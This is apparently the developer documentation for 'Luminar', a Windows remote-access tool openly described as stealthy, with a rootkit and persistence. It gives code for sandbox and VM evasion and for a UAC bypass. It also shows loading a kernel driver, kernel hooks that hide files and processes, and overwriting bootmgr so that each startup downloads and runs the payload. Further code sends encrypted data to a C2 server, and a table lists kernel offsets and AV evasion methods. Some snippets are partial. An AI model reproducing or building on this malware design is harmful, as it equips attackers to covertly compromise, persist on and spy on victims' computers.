# 📚 Luminar - Technical Documentation

## 🗂️ Table of Contents

1. [Introduction](#introduction)
2. [System Architecture](#system-architecture)
3. [Deployment Mechanism](#deployment-mechanism)
4. [Environment Detection](#environment-detection)
5. [Privilege Escalation](#privilege-escalation)
6. [Kernel Driver Loading](#kernel-driver-loading)
7. [Native Function Hooking](#native-function-hooking)
8. [Persistence](#persistence)
9. [Client-Server Communication](#client-server-communication)
10. [Technical Appendices](#technical-appendices)

## 📝 Introduction

Luminar is an advanced remote monitoring and control solution designed to operate stealthily on Windows systems. This technical documentation details the internal mechanisms and techniques used to ensure its operation, stealth, and persistence.

## 🏗️ System Architecture

Luminar consists of several interconnected modules:

1. **Client Module**: Main executable deployed on the target system
2. **Kernel Module**: Kernel-mode driver for low-level operations
3. **Persistence Module**: Component that modifies the bootloader to ensure persistence
4. **C2 Server**: Command and control infrastructure for client management


## 🚀 Deployment Mechanism

Luminar deployment follows a multi-stage process designed to maximize stealth and effectiveness:


### Advanced Technical Deployment Flow 🔬

The following diagram illustrates the detailed technical implementation of Luminar's deployment process:

```mermaid
graph TD
    subgraph "Shellcode Installer"
        A1[Find offset to client.exe] --> A2[Process Hollowing]
        A2 --> A3[Memory Injection]
    end
    
    A3 --> B1
    
    subgraph "Installer"
        B1[Write stager.exe to registry] --> B2[Create Windows service]
        B2 --> B3[Launch powershell.exe]
    end
    
    B3 --> C1
    
    subgraph "PowerShell"
        C1[AMSI bypass] --> C2[Invoke stager.exe reflectively]
        C2 --> C3[Memory Evasion Techniques]
    end
    
    C3 --> D1
    
    subgraph "Stager"
        D1[Unhook ntdll & kernel32.dll] --> D2[Load & decrypt Service EXE]
        D2 --> D3[Reflectively inject Service EXE]
        D3 --> D4[ETW & Event Log Bypass]
    end
    
    D4 --> E1
    
    subgraph "Luminar Service"
        E1[Unhook ntdll & kernel32.dll] --> E2[Initialize Luminar services]
        E2 --> E3[Inject all processes]
        E3 --> E4[Establish C2 Communication]
    end
    
    E4 --> F1
    
    subgraph "Rootkit"
        F1[Hook Windows APIs] --> F2[Hook child processes]
        F2 --> F3[Implement DKOM techniques]
        F3 --> F4[Patch in-memory structures]
    end
    
    subgraph "Persistence"
        F4 --> G1[Bootloader Modification]
        G1 --> G2[Registry Implants]
        G2 --> G3[WMI Event Subscription]
        G3 --> G4[Driver Loading at Boot]
    end
```



This advanced deployment flow demonstrates the sophisticated techniques used by Luminar to establish persistence while evading detection:

## 🕵️ Environment Detection

During its initial execution, Luminar performs a series of checks to determine if it's running in a virtual environment (sandbox, virtual machine) or on a real physical system.

### VM Detection Techniques 💻

```csharp
public static bool IsVirtualMachine()
{
    // Check hardware signatures
    if (CheckVMHardwareSignatures())
        return true;
        
    // Check for known VM artifacts
    if (CheckVMDrivers() || CheckVMServices())
        return true;
        
    
    // Timing analysis (VMs have different timing characteristics)
    if (PerformTimingAnalysis())
        return true;
        
    return false;
}
```

If a virtual machine is detected, Luminar adopts legitimate behavior to avoid detection, acting as a standard application without deploying its malicious components.

## 🔓 Privilege Escalation

On a real system, Luminar proceeds to escalate privileges from standard user (USER) to administrator rights (ADMIN).

### Elevation Techniques 🪜

1. **UAC Bypass**: Circumvention of User Account Control

```csharp
private static bool BypassUAC()
{
    // Using the deferred execution technique
    string systemDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
    string explorerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
    
    // Creating a COM task with automatic elevation
    ITaskService taskService = new TaskScheduler.TaskScheduler();
    taskService.Connect();
    
    // Configuring the task with elevated privileges
    // ...
    
    return true;
}
```

2. **SOON**

## 🧬 Kernel Driver Loading

Once administrator privileges are obtained, Luminar proceeds to load its kernel-mode driver.

### Driver Loading Process ⚙️

```csharp
private static bool LoadKernelDriver()
{
    // Extract driver from resources
    byte[] driverData = ExtractDriverResource();
    
    // Write driver to a temporary location
    string driverPath = Path.Combine(Path.GetTempPath(), GenerateRandomName() + ".sys");
    File.WriteAllBytes(driverPath, driverData);
    
    // Load driver via Service Control Manager
    IntPtr scmHandle = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
    
    if (scmHandle == IntPtr.Zero)
        return false;
    
    // Create and start service for the driver
    IntPtr serviceHandle = CreateService(scmHandle, "LuminarDriver", "Luminar System Service", 
                                        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, 
                                        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, 
                                        driverPath, null, IntPtr.Zero, null, null, null);
    
    if (serviceHandle == IntPtr.Zero)
    {
        // If service already exists, open it
        serviceHandle = OpenService(scmHandle, "LuminarDriver", SERVICE_ALL_ACCESS);
    }
    
    // Start the service
    bool result = StartService(serviceHandle, 0, null);
    
    // Cleanup
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    
    return result;
}
```

## 🪝 Native Function Hooking

Once loaded, the kernel-mode driver modifies Windows NT native functions to implement stealth capabilities.

### Hooking Technique 🧲

```c
// Kernel-mode driver code
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    // Driver initialization
    // ...
    
    // Hook NtQueryDirectoryFile function to hide files
    g_OriginalNtQueryDirectoryFile = (NtQueryDirectoryFilePtr)InterceptKernelFunction(
        L"NtQueryDirectoryFile", 
        (PVOID)HookedNtQueryDirectoryFile
    );
    
    // Hook NtQuerySystemInformation function to hide processes
    g_OriginalNtQuerySystemInformation = (NtQuerySystemInformationPtr)InterceptKernelFunction(
        L"NtQuerySystemInformation", 
        (PVOID)HookedNtQuerySystemInformation
    );
    
    // Hook other native functions
    // ...
    
    return STATUS_SUCCESS;
}

// Hooking function to hide files
NTSTATUS HookedNtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan)
{
    // Call the original function
    NTSTATUS status = g_OriginalNtQueryDirectoryFile(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass,
        ReturnSingleEntry, FileName, RestartScan);
    
    // If the call succeeded, filter the results
    if (NT_SUCCESS(status))
    {
        // Check prefix to hide files
        if (FileInformationClass == FileDirectoryInformation ||
            FileInformationClass == FileFullDirectoryInformation ||
            FileInformationClass == FileBothDirectoryInformation ||
            FileInformationClass == FileNamesInformation)
        {
            // Traverse file entries
            PVOID currentEntry = FileInformation;
            PVOID previousEntry = NULL;
            
            while (currentEntry != NULL)
            {
                // Get filename
                PUNICODE_STRING fileName = GetFileNameFromEntry(currentEntry, FileInformationClass);
                
                // Check if filename contains hidden prefix
                if (fileName != NULL && ContainsHiddenPrefix(fileName))
                {
                    // Hide entry by modifying list pointers
                    ModifyDirectoryEntryList(FileInformation, previousEntry, currentEntry, FileInformationClass);
                }
                else
                {
                    previousEntry = currentEntry;
                }
                
                // Move to next entry
                ULONG nextEntryOffset = GetNextEntryOffset(currentEntry, FileInformationClass);
                if (nextEntryOffset == 0)
                    break;
                    
                currentEntry = (PVOID)((ULONG_PTR)currentEntry + nextEntryOffset);
            }
        }
    }
    
    return status;
}
```

## ♻️ Persistence

To ensure its persistence, Luminar modifies the Windows bootloader to guarantee its loading at each system startup.

### Bootloader Modification 💾

```c
BOOL ModifyWindowsBootloader()
{
    // Open the bootloader
    HANDLE hBootmgr = CreateFile(
        L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1\\bootmgr",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hBootmgr == INVALID_HANDLE_VALUE)
        return FALSE;
    
    // Read the bootloader
    DWORD dwSize = GetFileSize(hBootmgr, NULL);
    PBYTE pBuffer = (PBYTE)malloc(dwSize);
    
    if (!ReadFile(hBootmgr, pBuffer, dwSize, &dwSize, NULL))
    {
        CloseHandle(hBootmgr);
        free(pBuffer);
        return FALSE;
    }
    
    // Modify the bootloader to include our download code
    BOOL bModified = FALSE;
    for (DWORD i = 0; i < dwSize - SIGNATURE_SIZE; i++)
    {
        if (MemCompare(&pBuffer[i], BOOTMGR_SIGNATURE, SIGNATURE_SIZE))
        {
            // Replace with our custom code
            memcpy(&pBuffer[i], CUSTOM_BOOTLOADER_CODE, CUSTOM_BOOTLOADER_SIZE);
            bModified = TRUE;
            break;
        }
    }
    
    // Write the modified bootloader
    if (bModified)
    {
        SetFilePointer(hBootmgr, 0, NULL, FILE_BEGIN);
        WriteFile(hBootmgr, pBuffer, dwSize, &dwSize, NULL);
    }
    
    // Cleanup
    CloseHandle(hBootmgr);
    free(pBuffer);
    
    return bModified;
}
```

The modified bootloader contains code that automatically downloads and executes the Luminar executable during system startup, thus ensuring its persistence even if the original file is deleted.

## 🌐 Client-Server Communication

Luminar uses an encrypted communication protocol to exchange data with its command and control (C2) server.

*I'm currently working on a new version of the client-server communication that makes it totally undetectable.*

### Communication Protocol 🔐

```csharp
private static byte[] EncryptCommunication(byte[] data, byte[] sessionKey)
{
    using (Aes aes = Aes.Create())
    {
        aes.Key = sessionKey;
        aes.GenerateIV();
        
        using (MemoryStream ms = new MemoryStream())
        {
            // Write initialization vector
            ms.Write(aes.IV, 0, aes.IV.Length);
            
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cs.Write(data, 0, data.Length);
                cs.FlushFinalBlock();
            }
            
            return ms.ToArray();
        }
    }
}

private static bool SendDataToC2(byte[] encryptedData)
{
    try
    {
        using (WebClient client = new WebClient())
        {
            // Configure client to hide its origin
            client.Headers.Add("User-Agent", GenerateLegitimateUserAgent());
            
            // Send data to C2 server
            byte[] response = client.UploadData(C2_SERVER_URL, "POST", encryptedData);
            
            // Process response
            ProcessC2Response(response);
            
            return true;
        }
    }
    catch
    {
        // Error handling
        return false;
    }
}
```

## 📑 Technical Appendices

### Important Data Structures 🏷️

```c
// Structure used for NtQuerySystemInformation hook
typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
```

### Important Offsets for Kernel Structures 📏

| Structure | Member | Offset (Windows 10 x64) | Offset (Windows 11 x64) |
|-----------|--------|------------------------|------------------------|
| EPROCESS | ActiveProcessLinks | 0x448 | 0x448 |
| EPROCESS | ImageFileName | 0x5A8 | 0x5A8 |
| EPROCESS | UniqueProcessId | 0x440 | 0x440 |
| ETHREAD | ThreadListEntry | 0x4E8 | 0x4E8 |
| DRIVER_OBJECT | MajorFunction | 0x070 | 0x070 |
| DRIVER_OBJECT | DriverStart | 0x018 | 0x018 |

### Detection Signatures to Avoid 🚫

Luminar implements techniques to avoid common detection signatures used by antivirus solutions and security analysis tools:

1. **Code Obfuscation**: Using obfuscation techniques to hide sensitive strings and functions
2. **Dynamic API Loading**: Dynamically resolving Windows function addresses to avoid detections based on import tables
3. **Anti-Analysis Techniques**: Implementing checks to detect debuggers and analysis environments
4. **Data Encryption**: Encrypting all sensitive data stored and transmitted

---

*This documentation is confidential and intended only for authorized developers of the Luminar project. Any unauthorized distribution is strictly prohibited.*

*Remember some examples are not complete and are only for educational purposes.*

*If you want to use this code, you must have the necessary permissions and knowledge to do so.*